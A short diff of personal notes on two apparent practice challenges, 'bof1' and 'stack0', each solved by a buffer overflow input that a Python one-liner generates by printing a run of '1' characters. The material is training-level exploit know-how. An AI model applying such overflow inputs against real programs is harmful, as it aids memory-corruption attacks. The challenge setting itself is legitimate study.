@@ -1,0 +1,13 @@
+==== bof1 ====
+
+buffer overflow
+
+python - c 'print "1"*45'
+
+
+==== stack0 ====
+
+buffer overflow
+
+python - c 'print "1"*51'
+
